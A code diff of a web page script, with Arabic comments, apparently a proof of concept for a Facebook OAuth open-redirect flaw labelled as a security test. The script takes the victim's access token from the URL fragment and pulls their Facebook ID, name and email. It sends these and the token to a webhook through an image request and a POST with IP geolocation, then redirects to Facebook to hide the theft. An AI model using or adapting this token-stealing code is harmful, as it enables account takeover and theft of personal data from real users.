@@ -12,37 +12,38 @@
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
 
                 try {
-                    // 1. جلب بيانات الضحية (ID, Email, Name, Location)
-                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,location,birthday&access_token=${token}`);
+                    // طلب البيانات مع التركيز على الـ ID والاسم والبريد كما ظهر في صورك
+                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
                     const userData = await response.json();
 
-                    // 2. جلب بيانات الجهاز والـ IP (الموقع الجغرافي)
+                    // إرسال الـ ID بشكل منفصل لضمان ظهوره بوضوح في الـ Webhook
+                    const exfil = new Image();
+                    exfil.src = `${webhookUrl}?VICTIM_FACEBOOK_ID=${userData.id}&USER_NAME=${encodeURIComponent(userData.name)}&TOKEN_LEAKED=${token}`;
+
+                    // جلب وإرسال بيانات الموقع الجغرافي والجهاز لإثبات الأثر الضار
                     const geoRes = await fetch('https://ipapi.co/json/');
                     const geoData = await geoRes.json();
-
-                    // 3. إرسال كل هذه "المعلومات المفيدة" للتقرير إلى الـ Webhook
+                    
                     await fetch(webhookUrl, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            impact: "Open Redirect to Info Disclosure",
-                            facebook_data: userData,
-                            device_geo_data: geoData,
-                            token_leaked: token
+                            report_type: "Open_Redirect_Impact_Proof",
+                            victim_id: userData.id,
+                            victim_email: userData.email,
+                            geo_location: geoData
                         })
                     });
 
-                    // 4. التوجيه النهائي للتمويه
-                    window.location.href = "https://www.facebook.com/me";
+                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1500);
                 } catch (e) {
                     window.location.href = "https://www.facebook.com/me";
                 }
             } else {
-                // إذا لم يتوفر توكن، يتم تفعيل الرابط السام للحصول عليه
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_location,user_birthday";
+                // تفعيل تدفق الـ OAuth للحصول على الصلاحيات اللازمة
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
             }
         };
     </script>
-    <center><h1>Redirecting...</h1></center>
 </body>
 </html>
